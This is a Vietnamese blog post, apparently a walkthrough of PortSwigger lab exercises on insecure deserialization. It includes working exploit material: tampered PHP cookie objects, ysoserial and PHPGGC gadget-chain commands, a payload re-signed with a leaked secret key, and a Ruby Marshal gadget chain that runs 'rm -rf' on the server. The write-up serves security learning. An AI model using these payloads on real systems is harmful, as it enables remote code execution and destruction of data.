---
title: Insecure Deserialization
published: 2025-08-15
description: 'Insecure Deserialization vulnerability'
tags: [Portswigger, Pentest]
category: 'Learning'
draft: false 
image: "/assets/post_image/insecure_des.png"
---


# Learning about: Insecure Deserialization

## I. Khái quát lỗ hỏng
### 1. Serialization
Trước khi ta tìm hiểu về lỗ hỏng thì cần phải biết đến quy trình `Serialize` là gi!
`Serialize` hay `tuần tự hóa`là quá trình chuyển đổi một đối tượng trong bộ nhớ thành một chuỗi `byte` (hoặc một định dạng khác như JSON, XML) để có thể dễ dàng lưu trữ hoặc truyền đi. 
![image](https://hackmd.io/_uploads/ryJIhdNule.png)
Các ngôn ngữ lập trình như `Java, .NET, PHP, Python` đều có các cơ chế để thực hiện quá trình này. Ví dụ, trong `Java`, có thể sử dụng lớp `ObjectInputStream`, trong `PHP` có hàm `unserialize()`
Serialize rất hữu ích trong nhiều trường hợp:
* `Lưu trữ dữ liệu`: Ta có thể lưu trữ trạng thái của một đối tượng vào file hoặc database. Ví dụ, ta có một đối tượng `User` với các thuộc tính `id, name, email`. Thay vì lưu từng thuộc tính riêng lẻ, ta có thể `serialize` toàn bộ đối tượng và lưu dưới dạng một chuỗi duy nhất.
* `Truyền dữ liệu qua mạng`: Khi giao tiếp giữa các hệ thống, các đối tượng không thể được truyền trực tiếp. Cần phải `serialize` chúng thành chuỗi `byte` để gửi qua mạng và sau đó `deserialize` ở phía nhận.
Sử dụng `cache`: Để tăng tốc độ truy cập, các ứng dụng thường lưu trữ các đối tượng phức tạp trong cache. `Serialize` cho phép  lưu trữ các đối tượng này một cách hiệu quả.

Giả sử ta có một `Object Python` là một `User_information` chứa các thuộc tính về thông tin nguời dùng. Chúng ta muốn lưu trữ đối tượng này vào một file hoặc gửi đi qua mạng.
```python 
import json

User_information = {
    "ten": "Nguyen Van A",
    "tuoi": 30,
    "thanh_pho": "Ha Noi",
    "la_nhan_vien": True
}

# Bước 1: Tuần tự hóa đối tượng Python thành một chuỗi JSON
chuoi_json = json.dumps(User_information)

# Bước 2: In ra chuỗi JSON đã được tạo ra
print("Đây là chuỗi JSON sau khi tuần tự hóa:")
print(chuoi_json)
print(type(chuoi_json))

# Bước 3: Ghi chuỗi JSON này vào một file
with open("nguoi_dung.json", "w", encoding="utf-8") as f:
    f.write(chuoi_json)

print("\nĐối tượng đã được lưu vào file 'nguoi_dung.json'")
```
Kết quả của đoạn code trên sẽ là một chuỗi `JSON` có thể đọc được và một file `nguoi_dung.json` với nội dung tương tự. Đây chính là quá trình biến đổi đối tượng từ bộ nhớ thành một định dạng để lưu trữ.

### 2. Deserialization
Ngược lại với quá trình trên chính là `Deserialization` hay còn gọi là `giải tuần tự hóa`. Quá trình này sẽ biến từ một chuỗi `byte` hoặc các giá trị đã được `tuần tự hóa` quay trở về định dạng ban đầu (chính là các objects)

Bây giờ, chúng ta sẽ đọc file nguoi_dung.json đã tạo ở trên và chuyển đổi chuỗi JSON trở lại thành một đối tượng Python.
```python
import json

# Bước 1: Đọc chuỗi JSON từ file
with open("nguoi_dung.json", "r", encoding="utf-8") as f:
    chuoi_json_tu_file = f.read()

print("Đây là chuỗi JSON được đọc từ file:")
print(chuoi_json_tu_file)

# Bước 2: Giải tuần tự hóa chuỗi JSON thành đối tượng Python
thong_tin_nguoi_dung_moi = json.loads(chuoi_json_tu_file)

# Bước 3: In ra đối tượng Python đã được tạo lại
print("\nĐây là đối tượng Python sau khi giải tuần tự hóa:")
print(thong_tin_nguoi_dung_moi)
print(type(thong_tin_nguoi_dung_moi))

# Kiểm tra một giá trị trong đối tượng
print("\nTuổi của người dùng là:", thong_tin_nguoi_dung_moi["tuoi"])
```

## II. Cách detect lỗ hỏng
### PHP serialization format
Hầu hết đối với format của `PHP` dẽ dùng các tài nguyên dễ đọc cho người dùng. Ví dụ ta có object `User`với các thuộc tính sau
```php 
$user->name = "carlos";
$user->isLoggedIn = true;
```
Và object này sau khi được `serialized` thì sẽ thành như sau 
```php 
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```
* `O:4:"User":2:` : Lần lượt `O` sẽ là `Object` và `4` ở đây sẽ biểu thị việc số kí tự trong tên của `Object` đó sẽ là `User=4` tiếp đến là `2` sẽ biểu thj việc `Object` có 2 `Attributes`
* `{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}`: `s` sẽ biểu thị data type của thuộc tính này và nó là `string` và tương tự như trên `4` sẽ là độ dài của tên thuộc tính và tương tự với các thuộc tính còn lại
### Java serialization format
Đối với java thì các `serialized data` thường ở dạn `binary` nên ta sẽ khó có thể đọc được hơn. Nhưng đối với việc này sẽ có thể dùng `Hackverter` để dễ dàng khai thác. Ta sẽ tiến hành tìm hiểu ở phần sau

## III. Exploits
### 1. Manipulating serialized objects
#### Modifying object attributes
Đến với trường hợp đơn giản nhất của lỗ hỏng. Thì các `serilized data` sẽ không hề được bảo vệ bới bất cứ biện pháp nào dẫn đến việc `hacker` có thể lợi dụng để sửa đổi dữ liệu này và thực hiện các hành đọc như `leo thang đặc quyền`,...
Ví dụ như ứng dụng dùng một object `User` để lưu trữ thông tin người dùng ở trong cookie như sau
```php 
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```
Do `serialized data` không hề được bảo vệc nên `hackers` có thể tiến hành sửa đổi và đổi thuộc tính `isAdmin` thành `true` để thực hiện leo quyền. Ta sẽ tiến hành thực hành với lab
![image](https://hackmd.io/_uploads/B1XK2pHOex.png)
Lab này ta sẽ có credential là `wiener:peter`. Và ta có thể thấy phần `serialized data` được lưu ở cookie để verified user
![image](https://hackmd.io/_uploads/By3a26ruel.png)
Và ở trong sẽ có một thuộc tính là `admin`, ta có thể tiến hành sửa đổi giá trị `booleam` thành `1`
![image](https://hackmd.io/_uploads/BJH-TaS_gg.png)
Sau khi thay đổi thành công và gửi request không hề có chút khó khăn gì thì ta đã trở thành admin và có thể vào `admin_panel` để xóa user `Carlos`
![image](https://hackmd.io/_uploads/SJ7TpaSule.png)

#### Modifying data types
Ở biến thể này sẽ khai thác dựa trên việc so sánh các điều kiện if else lỏng lẻo ở các phiên bản `php` cũ. Cụ thể `PHP` có toán tử so sánh `==`. Khi so sánh một số với một chuỗi, `PHP` sẽ cố gắng chuyển đổi chuỗi đó thành số. Điều này dẫn đến các trường hợp so sánh bất thường, ví dụ: `0 == "một chuỗi bất kỳ"` (trên PHP 7.x trở về trước) hoặc `5 == "5 một chuỗi bất kỳ"` luôn trả về true.
Dựa trên điều này thì `hackers` dễ dàng dùng đẻ leo quyền thành một người dùng khác hoặc thâm chí là cả `admin` bằng cách sửa đổi các `serialized data` và thêm số `0` vào bên trong các chuỗi tuơng ứng
Thực hành với lab, ta cũng sẽ có `credential` như lab trước, và `serialized data` sẽ được lưu ở cookie
![image](https://hackmd.io/_uploads/BywKvRS_ll.png)
Ta thấy, cookie sẽ có một thuộc tính mới là `access_token`, đây sẽ là nơi để kiểm tra user của ta. Việc phải thác ta sẽ đổi username thành `administrator` và sau đó là sửa `access_token` thành `0` để lợi dụng việc so sánh như đã nói ở phía `PHP`
![image](https://hackmd.io/_uploads/BJXWOArdgl.png)
Và ta đã có thể leo quyền thành `admin` và sau đó truy cập thành công `admin panel`

### 2. Using application functionality
Thay vì chỉ thay đổi các giá trị thuộc tính để vượt qua kiểm tra, `hackers` có thể sử dụng lỗ hổng để cung cấp dữ liệu độc hại cho các chức năng của ứng dụng.
Ví dụ một trang web có chức năng "Xóa người dùng" (Delete user).
* Chức năng này sẽ xóa ảnh hồ sơ của người dùng bằng cách truy cập đường dẫn lưu trong thuộc tính $user->image_location.
* Nếu đối tượng `$user` này được tạo ra từ dữ liệu đã được giải tuần tự hóa, kẻ tấn công có thể thay đổi thuộc tính image_location thành một đường dẫn tùy ý (ví dụ: đường dẫn đến một file cấu hình quan trọng của hệ thống).
* Khi kẻ tấn công xóa tài khoản của chính mình, chức năng `Xóa người dùng` sẽ vô tình xóa file cấu hình quan trọng đó thay vì ảnh hồ sơ của họ.Một trang web có chức năng "Xóa người dùng" (Delete user).

Đến với lab ta sẽ có một tab chức năng như này sau khi login, và sẽ có nút để `Delete acocunt`. 
![image](https://hackmd.io/_uploads/rk6LBXUdxl.png)
Sau khi ân vào ta bắt được `res` có chứa `serialized data` ở cookie như sau
![image](https://hackmd.io/_uploads/HJ7prQUdxg.png)
Nhiệm vụ của ta là xóa file `morale.txt` ở phía tài khoản của `carlos`. Đơn giản ta chỉ cần thay đổi phần đường dẫn ở phía `avatar_link` và sau đó đổi lại chiều dài của chuỗi
![image](https://hackmd.io/_uploads/B1j2P7IOee.png)

### 3. Injecting arbitrary objects
Đâylà một kỹ thuật tấn công trong đó kẻ tấn công gửi một đối tượng đã được `serialize` với một lớp (class) không mong đợi tới ứng dụng. Ứng dụng sẽ `deserialize` mà không kiểm tra xem đối tượng đó có đúng loại mà nó mong đợi hay không. Kỹ thuật này cho phép kẻ tấn công tạo ra một phiên bản của một lớp tùy ý có sẵn trong ứng dụng.
Khi quá trình `deserialize` diễn ra, các `magic methods` của đối tượng được gọi tự động. Nếu một trong những phương thức này thực hiện một hành động nguy hiểm (ví dụ: thực thi lệnh hệ thống, ghi file, v.v.) dựa trên dữ liệu mà kẻ tấn công kiểm soát, thì kẻ tấn công có thể lợi dụng điều này để chiếm quyền kiểm soát ứng dụng.

Giờ ta sẽ đến với phần thực hành lab để hiểu thêm về biến thể này 
![image](https://hackmd.io/_uploads/r1sw3ZDOxe.png)
Ta vấn sẽ được cấp một `credential` như lab trước nhưng sẽ không có tính năng xóa tài khoản. View source thì ta thấy được một dir thú vị
![image](https://hackmd.io/_uploads/HJrshbwdlx.png)
Vào check xem đường dẫn này thì sau khi `GET` ta không nhận được data gì
![image](https://hackmd.io/_uploads/ByllTWPuxx.png)
Sau một lúc mình có check lạii `hint` của lab này ta sẽ thấy rằng, có thể xem source của một file bằng cách chèn `~` vào cuối tên file đó. Đây có lẽ là một `misconfiguration` ở phía local mà sau khi deploy dev đã không xóa đi
![image](https://hackmd.io/_uploads/H1cxpZv_ee.png)
Sau khi chèn `~` vào thì ta có thể dễ dàng xem được source của file này
```php 
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
Đoạn code định nghĩa một lớp `PHP` tên là `CustomTemplate` để quản lý các file mẫu. Lớp này sử dụng một file khóa (lock file) để ngăn chặn việc ghi đè file mẫu khi nó đang được chỉnh sửa. Tuy nhiên nhìn ở phía dưới sẽ có một `magic methods` là `__destruct()` sẽ được gọi mỗi lần thực hiện `deserialize` và nhiệm vụ của nó là xóa `lock_file_path`, ta có thể thao túng được đường dẫn này khiến một lần `deserialize` nó sẽ xóa file ở `/home/carlos/morale.txt`
Như đã thấy từ trước thì phần `serialized data` sẽ lưu ở cookie
![image](https://hackmd.io/_uploads/Sk2jAZDule.png)
Ta có thể inject một object khác 
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
Sau đó tiến hành encode bằng `b64` và lưu vào cookie là thành công!!

![image](https://hackmd.io/_uploads/Ski-kfv_ee.png)

### 4. Gadget chains
`Gadget chains` là một chuỗi các phương thức (method) có sẵn trong ứng dụng được kẻ tấn công xâu chuỗi lại với nhau để đạt được mục tiêu cuối cùng, thường là thực thi mã độc.
Trước khi đến sâu với thực hiện khai thác và tìm `Gadget chains`, mình sẽ tìm hiểu về một tool tên là `ysoserial` có thể [tải ở đây](https://github.com/frohoff/ysoserial)
`ysoserial` là một công cụ mạnh mẽ và phổ biến để tạo các payload khai thác lỗ hổng `Java Deserialization`. Nó bao gồm nhiều `gadget chains` có sẵn, cho phép ta có thể khai thác và thậm chí là `RCE`
Ta có thể chạy lệnh bằng `javar -jar` với cú pháp `javar -jar ysoserial-all.jar`
![image](https://hackmd.io/_uploads/r1bZ-_duex.png)
Nhưng với từ `java 9` trở lên ta nên dùng cú pháp 
```java
java \
    --add-opens=... \
    -jar ysoserial-all.jar \
    [Command] [Payload]
```
Giờ đến với lab thực hành
![image](https://hackmd.io/_uploads/Bk9zE0u_xe.png)
Như ta thấy thì điểm mấu chốt thì `serialized data` vẫn nằm ở cookie. Đối với `ysoserial` thì ta có thể check xem trang web có lỗ hỏng không bằng cách tìm cách inject point phù hợp và dùng command `URLDNS`. Còn ở đây ta đã biết trang web có lỗ hỏng cụ thể ở cookie nên ta sẽ dùng trực tiếp công cụ để xóa được file `morale.txt`
Ta sẽ dùng lệnh 
```java
java \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar \
   CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 > cookie.txt
```
Ta sẽ lưu kết quả ở một file vì khi copy trực tiếp qua terminal sẽ để lại các khoảng trắng, sẽ mất thời gian để xóa đi. Kết quả ta được 
![image](https://hackmd.io/_uploads/BJuC4RdOee.png)
Một đoạng payload dài, và ta sẽ dán vào cookie. Nên nhớ là sẽ cần `URL encode` lại để có thể thực thi
![image](https://hackmd.io/_uploads/rkkzH0duee.png)

### 5. PHP Generic Gadget Chains
Tương tự với các ứng dụng web được code bằng `Java` thì các ứng dụng `PHP` cũng có một tool để khai thác lỗ hỏng `Insecure Deserialization` đó là [PHPGCC](https://github.com/ambionics/phpggc)
Sau khi tải tool, ta có thể `./phpgcc -l` để list các `gadget-chains` có thể dùng để khai thác
![image](https://hackmd.io/_uploads/rJ3t2RYuxe.png)
Đến với lab thực hành, ta sẽ tận dụng tools để thực hiện khai thác
![image](https://hackmd.io/_uploads/SJYmJe9uee.png)
Ta thấy cũng như các lab trước `serialized data` được lưu ở cookie, cookie chứa token encode bằng `b64` và kí bằng `SHA1`
```json 
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtMGw5ejBweHZmcDJ1cmkyNjd4MjJ5bWNpcGluOGo4aiI7fQ==","sig_hmac_sha1":"38b695f643bb3acc3251ee20dabedcb7e3a402c7"}
```
Nếu ta thử thay giá trị session một chút, thì khi gửi `req` sẽ nhận được lỗi 500 về `Symfony Version: 4.3.6`
![image](https://hackmd.io/_uploads/rJamgx5Ogl.png)
Ta check thêm phần source code ở trang home thì ta thấy thêm một đường dẫn đến debug file của php
![image](https://hackmd.io/_uploads/rkZOll5Ogx.png)
Ở đây ta có thể được các biến nhạy cảm cũng như là cả `SECRET_KEY`. Hiện tại ta sẽ lưu lại và sẽ cần dùng ở giai đoạn sau
![image](https://hackmd.io/_uploads/SycQ-gqOxx.png)
Quay trở lại với tool `PHPGCC` thì sau khi list ra các `gadget-chains` ta sẽ thấy có cả `Symfony` có thể khai thác
![image](https://hackmd.io/_uploads/H1Jn-lcOex.png)
Ở đây ta sẽ dùng `Symfony/RCE4` vì version của server đang là `4.3.6` theo `res` từ lỗi 500 ta nhận được 
![image](https://hackmd.io/_uploads/SyA4Xx5dee.png)
Sau khi có được thứ cần thiết, thì việc ta cần làm là ký lại với `SECRET_KEY` ta tìm được để trở thành một session hợp lệ
```php 
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "2uvhezbny9jsg5ycuwkz5xh0ks1n9p6m";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```
Kết quả ta sẽ có được session hợp lệ và sau đó là gán vào cookie và gửi `req`

### 6. Working with documented gadget chains
Không phải mọi `framework` hay thư viện đều có một công cụ như `ysoserial` hoặc `PHPGGC` hỗ trợ. Điều này đặc biệt đúng với các `framework` mới hoặc ít phổ biến. Thay vì tự tìm gadget chain từ đầu (một quá trình rất phức tạp và tốn thời gian), bạn nên tìm kiếm trên mạng để xem các nhà nghiên cứu bảo mật khác đã phát hiện và ghi lại các `gadget-chains` cho `framework` đó chưa. Các nguồn thông tin tốt bao gồm `GitHub`, các blog về bảo mật, và các tài liệu nghiên cứu.

Đến với lab, thì ứng dụng vẫn dùng cookie là một `serialized data object`
![image](https://hackmd.io/_uploads/BJFk1Q9ueg.png)
Và khi decode ra ta được data hex như này. Đủ để nhận biết đây là một `serialized data object` của `Ruby` theo `Marshall Format` cụ thể [ở đây](https://docs.ruby-lang.org/en/3.2/marshal_rdoc.html)
![image](https://hackmd.io/_uploads/H16dgX5dxx.png)
Giờ đến công việc tìm payload để khai thác cho lab này, sau một lúc tìm bằng `Searchsploit` không ra kết quả thì mình đành tìm bằng google và ra được một bài blog [Universal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html).
```ruby 
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm -rf /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```
Ta sẽ sửa lại payload ở cuối chút như này, và nên nhớ sẽ dùng `Ruby 2.6.5` thay vì `3.2` để không bị lỗi dẫn đến không ra kết quả. Ở đây mình sẽ dùng `JĐoole` vì nó cho ta lựa chọn các phiên bản khác nhau để chạy
![image](https://hackmd.io/_uploads/H1KOrX5_xg.png)
Giờ ta chỉ việc dáng chuỗi này vào session và run

